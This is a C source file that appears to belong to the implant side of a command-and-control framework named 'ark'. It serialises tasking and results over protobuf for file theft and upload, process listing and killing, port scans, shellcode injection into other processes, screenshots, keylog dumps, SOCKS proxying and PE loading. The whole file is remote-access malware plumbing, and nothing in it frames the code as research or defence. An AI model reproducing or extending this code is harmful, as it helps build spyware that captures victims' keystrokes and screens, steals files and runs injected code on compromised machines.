#include <stdlib.h>
#include <string.h>

#include "ark/pb_c2.h"
#include "ark/pb_wire.h"

static int decode_string_field(ark_pb_reader *r, uint8_t wire, char *dst, size_t cap) {
    const uint8_t *b;
    size_t n;
    if (wire != 2 || !ark_pb_read_bytes(r, &b, &n)) return 0;
    ark_pb_copy_bytes(dst, cap, b, n);
    return 1;
}

static int decode_bytes_field(ark_pb_reader *r, uint8_t wire, uint8_t **out, size_t *out_len) {
    const uint8_t *b;
    size_t n;
    if (wire != 2 || !ark_pb_read_bytes(r, &b, &n)) return 0;
    *out = (uint8_t *)malloc(n);
    if (!*out) return 0;
    memcpy(*out, b, n);
    *out_len = n;
    return 1;
}

static int append_ports_from_packed(const uint8_t *b, size_t n, ark_portscan_task *t) {
    ark_pb_reader pr;
    ark_pb_reader_init(&pr, b, n);
    while (pr.pos < pr.len && t->port_count < ARK_MAX_PORTS) {
        uint64_t v;
        if (!ark_pb_read_varint(&pr, &v)) break;
        t->ports[t->port_count++] = (uint32_t)v;
    }
    return 1;
}

static int encode_process_info(const ark_process_info *p, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 128)) return 0;
    ark_pb_write_uint32(&w, 1, p->pid);
    ark_pb_write_uint32(&w, 2, p->ppid);
    ark_pb_write_string(&w, 3, p->name);
    return ark_pb_writer_finish(&w, out, out_len);
}

static int encode_net_iface(const ark_net_interface *iface, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 512)) return 0;
    ark_pb_write_string(&w, 1, iface->name);
    for (size_t i = 0; i < iface->address_count; i++)
        ark_pb_write_string(&w, 2, iface->addresses[i]);
    ark_pb_write_string(&w, 3, iface->mac);
    ark_pb_write_uint32(&w, 4, iface->mtu);
    ark_pb_write_bool(&w, 5, iface->up);
    return ark_pb_writer_finish(&w, out, out_len);
}

static int encode_port_result(const ark_port_result *p, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 256)) return 0;
    ark_pb_write_string(&w, 1, p->host);
    ark_pb_write_uint32(&w, 2, p->port);
    ark_pb_write_bool(&w, 3, p->open);
    if (p->service[0]) ark_pb_write_string(&w, 4, p->service);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_decode_file_download_task(const uint8_t *in, size_t in_len, ark_file_download_task *t) {
    memset(t, 0, sizeof(*t));
    ark_pb_reader r;
    ark_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (ark_pb_reader_next(&r, &field, &wire)) {
        if (field == 1) decode_string_field(&r, wire, t->remote_path, sizeof(t->remote_path));
        else if (!ark_pb_skip(&r, wire)) return 0;
    }
    return 1;
}

int ark_pb_decode_file_upload_task(const uint8_t *in, size_t in_len, ark_file_upload_task *t) {
    memset(t, 0, sizeof(*t));
    ark_pb_reader r;
    ark_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (ark_pb_reader_next(&r, &field, &wire)) {
        if (field == 1) decode_string_field(&r, wire, t->remote_path, sizeof(t->remote_path));
        else if (field == 2) decode_bytes_field(&r, wire, &t->data, &t->data_len);
        else if (!ark_pb_skip(&r, wire)) return 0;
    }
    return 1;
}

void ark_pb_free_file_upload_task(ark_file_upload_task *t) {
    free(t->data);
    t->data = NULL;
    t->data_len = 0;
}

int ark_pb_encode_file_download_result(const char *filename, const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, data_len + 256)) return 0;
    ark_pb_write_string(&w, 1, filename);
    ark_pb_write_bytes(&w, 2, data, data_len);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_file_upload_result(int success, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 32)) return 0;
    ark_pb_write_bool(&w, 1, success);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_decode_process_kill_task(const uint8_t *in, size_t in_len, ark_process_kill_task *t) {
    memset(t, 0, sizeof(*t));
    ark_pb_reader r;
    ark_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (ark_pb_reader_next(&r, &field, &wire)) {
        if (field == 1 && ark_pb_read_varint(&r, &v)) t->pid = (uint32_t)v;
        else if (!ark_pb_skip(&r, wire)) return 0;
    }
    return 1;
}

int ark_pb_encode_process_list_result(const ark_process_info *procs, size_t count, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, count * 128 + 64)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_process_info(&procs[i], &sub, &sub_len)) {
            ark_pb_writer_free(&w);
            return 0;
        }
        ark_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_process_kill_result(int success, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 16)) return 0;
    ark_pb_write_bool(&w, 1, success);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_net_ifconfig_result(const ark_net_interface *ifaces, size_t count, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, count * 512 + 64)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_net_iface(&ifaces[i], &sub, &sub_len)) {
            ark_pb_writer_free(&w);
            return 0;
        }
        ark_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    return ark_pb_writer_finish(&w, out, out_len);
}

void ark_pb_free_net_ifconfig_result(ark_net_interface *ifaces, size_t count) {
    if (!ifaces) return;
    for (size_t i = 0; i < count; i++) {
        if (ifaces[i].addresses) {
            for (size_t j = 0; j < ifaces[i].address_count; j++)
                free(ifaces[i].addresses[j]);
            free(ifaces[i].addresses);
        }
    }
    free(ifaces);
}

int ark_pb_decode_portscan_task(const uint8_t *in, size_t in_len, ark_portscan_task *t) {
    memset(t, 0, sizeof(*t));
    ark_pb_reader r;
    ark_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (ark_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        switch (field) {
        case 1:
            decode_string_field(&r, wire, t->target, sizeof(t->target));
            break;
        case 2:
            if (wire == 2 && ark_pb_read_bytes(&r, &b, &n))
                append_ports_from_packed(b, n, t);
            else if (wire == 0 && ark_pb_read_varint(&r, &v) && t->port_count < ARK_MAX_PORTS)
                t->ports[t->port_count++] = (uint32_t)v;
            break;
        case 3:
            ark_pb_read_varint(&r, &v);
            t->timeout_ms = (uint32_t)v;
            break;
        case 4:
            ark_pb_read_varint(&r, &v);
            t->threads = (uint32_t)v;
            break;
        default:
            if (!ark_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

int ark_pb_encode_portscan_result(const ark_port_result *ports, size_t count, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, count * 256 + 64)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_port_result(&ports[i], &sub, &sub_len)) {
            ark_pb_writer_free(&w);
            return 0;
        }
        ark_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_decode_inject_task(const uint8_t *in, size_t in_len, ark_inject_task *t) {
    memset(t, 0, sizeof(*t));
    ark_pb_reader r;
    ark_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (ark_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1:
            decode_string_field(&r, wire, t->method, sizeof(t->method));
            break;
        case 2:
            ark_pb_read_varint(&r, &v);
            t->target_pid = (uint32_t)v;
            break;
        case 3:
            decode_bytes_field(&r, wire, &t->shellcode, &t->shellcode_len);
            break;
        default:
            if (!ark_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

void ark_pb_free_inject_task(ark_inject_task *t) {
    free(t->shellcode);
    t->shellcode = NULL;
    t->shellcode_len = 0;
}

int ark_pb_encode_inject_result(int success, uint32_t pid, uint32_t tid, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 64)) return 0;
    ark_pb_write_bool(&w, 1, success);
    ark_pb_write_uint32(&w, 2, pid);
    ark_pb_write_uint32(&w, 3, tid);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_screenshot_result(const uint8_t *img, size_t img_len, uint32_t w, uint32_t h, uint8_t **out, size_t *out_len) {
    ark_pb_writer pw;
    if (!ark_pb_writer_init(&pw, img_len + 128)) return 0;
    ark_pb_write_bytes(&pw, 1, img, img_len);
    ark_pb_write_string(&pw, 2, "bmp");
    ark_pb_write_uint32(&pw, 3, w);
    ark_pb_write_uint32(&pw, 4, h);
    *out = pw.data;
    *out_len = pw.len;
    return 1;
}

typedef struct {
    char    window_title[256];
    char    keys[256];
    int64_t timestamp;
} ark_keylog_entry_enc;

static int encode_keylog_entry(const ark_keylog_entry_enc *e, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 128)) return 0;
    if (e->window_title[0]) ark_pb_write_string(&w, 1, e->window_title);
    if (e->keys[0]) ark_pb_write_string(&w, 2, e->keys);
    ark_pb_write_int64(&w, 3, e->timestamp);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_keylog_dump_result(const void *entries, size_t count, uint8_t **out, size_t *out_len) {
    const ark_keylog_entry_enc *ents = (const ark_keylog_entry_enc *)entries;
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 512)) return 0;
    if (count == 0) {
        ark_pb_writer_free(&w);
        if (out) *out = NULL;
        if (out_len) *out_len = 0;
        return 0;
    }
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_keylog_entry(&ents[i], &sub, &sub_len)) { ark_pb_writer_free(&w); return 0; }
        ark_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_socks_start_result(int success, uint32_t port, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 32)) return 0;
    ark_pb_write_bool(&w, 1, success);
    ark_pb_write_uint32(&w, 2, port);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_socks_stop_result(int success, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 16)) return 0;
    ark_pb_write_bool(&w, 1, success);
    return ark_pb_writer_finish(&w, out, out_len);
}

int ark_pb_encode_peload_result(int success, const uint8_t *output, size_t output_len, uint8_t **out, size_t *out_len) {
    ark_pb_writer w;
    if (!ark_pb_writer_init(&w, 64)) return 0;
    ark_pb_write_bool(&w, 1, success);
    if (output && output_len) ark_pb_write_bytes(&w, 2, output, output_len);
    return ark_pb_writer_finish(&w, out, out_len);
}
